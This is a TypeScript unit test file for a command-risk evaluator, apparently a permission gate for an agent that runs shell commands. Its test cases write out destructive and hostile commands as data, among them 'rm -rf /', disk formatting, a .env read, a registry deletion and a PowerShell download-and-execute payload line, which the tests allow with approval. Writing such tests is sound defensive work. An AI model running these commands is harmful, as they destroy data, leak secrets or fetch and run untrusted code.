import { describe, expect, it } from "vitest";
import { evaluateCommand } from "./index.js";

describe("evaluateCommand", () => {
  it("requires approval for harmless commands", () => {
    const decision = evaluateCommand("pwd");
    expect(decision.allowed).toBe(true);
    expect(decision.requiresApproval).toBe(true);
  });

  it("blocks destructive commands", () => {
    const decision = evaluateCommand("rm -rf /");
    expect(decision.allowed).toBe(false);
    expect(decision.risk).toBe("blocked");
  });

  it("allows PowerShell Format-* display cmdlets with approval", () => {
    const decision = evaluateCommand("Format-Hex -Path 'README.md'");
    expect(decision.allowed).toBe(true);
    expect(decision.requiresApproval).toBe(true);
  });

  it("blocks disk formatting commands", () => {
    const decision = evaluateCommand("format C:");
    expect(decision.allowed).toBe(false);
    expect(decision.risk).toBe("blocked");
  });

  it("blocks sensitive file reads", () => {
    const decision = evaluateCommand("Get-Content .env");
    expect(decision.allowed).toBe(false);
    expect(decision.risk).toBe("blocked");
  });

  it("blocks reads outside the workspace", () => {
    const decision = evaluateCommand("Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts'");
    expect(decision.allowed).toBe(false);
    expect(decision.risk).toBe("blocked");
  });

  it("allows workspace file writes via Set-Content but still blocks pipes and redirects when targeting outside workspace", () => {
    // Set-Content to workspace paths is allowed (with approval) for tool output persistence
    expect(evaluateCommand("Set-Content README.md 'changed'").allowed).toBe(true);
    expect(evaluateCommand("Set-Content README.md 'changed'").risk).toBe("low");
    // Pipe-based file writes to workspace are now allowed (path validation takes precedence)
    expect(evaluateCommand("'changed' | Out-File README.md").allowed).toBe(true);
    // Shell redirects to workspace paths are now allowed (path validation takes precedence)
    expect(evaluateCommand("echo changed > README.md").allowed).toBe(true);
    // But redirects to outside workspace are still blocked
    expect(evaluateCommand("echo changed > C:\\Windows\\test.txt").allowed).toBe(false);
  });

  it("allows New-Item -ItemType Directory for safe directory creation", () => {
    expect(evaluateCommand("New-Item -ItemType Directory -Path data").allowed).toBe(true);
    expect(evaluateCommand("New-Item -ItemType Directory -Force -Path .\\data").allowed).toBe(true);
    // New-Item without -ItemType Directory is still blocked
    expect(evaluateCommand("New-Item -ItemType File -Path test.txt").allowed).toBe(false);
  });

  it("blocks Set-Content writing outside the workspace", () => {
    expect(evaluateCommand("Set-Content -Path 'C:\\Windows\\test.txt' 'bad'").allowed).toBe(false);
    expect(evaluateCommand("Set-Content -Path '..\\outside.txt' 'bad'").allowed).toBe(false);
  });

  it("marks scanners as medium risk (allowed with approval)", () => {
    const decision = evaluateCommand("nmap example.com");
    expect(decision.allowed).toBe(true);
    expect(decision.risk).toBe("medium");
    expect(decision.requiresApproval).toBe(true);
  });

  it("allows Invoke-Expression with high-risk approval instead of blocking", () => {
    // iex / Invoke-Expression is commonly needed in exploit PoCs.
    // It's now high-risk (allowed with approval) instead of blocked.
    const decision = evaluateCommand("powershell -c \"iex (New-Object Net.WebClient).DownloadString('http://127.0.0.1/payload')\"");
    expect(decision.allowed).toBe(true);
    expect(decision.risk).toBe("high");
    expect(decision.requiresApproval).toBe(true);
  });

  it("allows file rename/move/copy with approval when targeting workspace", () => {
    expect(evaluateCommand("Rename-Item -Path old.txt -NewName new.txt").allowed).toBe(true);
    expect(evaluateCommand("Move-Item -Path data.json -Destination archive/").allowed).toBe(true);
    expect(evaluateCommand("Copy-Item -Path template.txt -Destination payload.txt").allowed).toBe(true);
    // But blocks rename/move/copy targeting outside workspace
    expect(evaluateCommand("Copy-Item -Path 'C:\\Windows\\System32\\test.dll' -Destination .").allowed).toBe(false);
  });

  it("still blocks truly destructive commands", () => {
    expect(evaluateCommand("rm -rf /").allowed).toBe(false);
    expect(evaluateCommand("shutdown /s /t 0").allowed).toBe(false);
    expect(evaluateCommand("format C:").allowed).toBe(false);
    expect(evaluateCommand("reg delete HKLM\\Software\\Bad").allowed).toBe(false);
    expect(evaluateCommand("Remove-Item -Path . -Recurse -Force").allowed).toBe(false);
  });

  it("allows grep-style HTML marker extraction without treating it as redirection", () => {
    const decision = evaluateCommand('curl.exe -s http://127.0.0.1:3000 | findstr /i "<title>"');
    expect(decision.allowed).toBe(true);
    expect(decision.risk).toBe("low");
  });
});
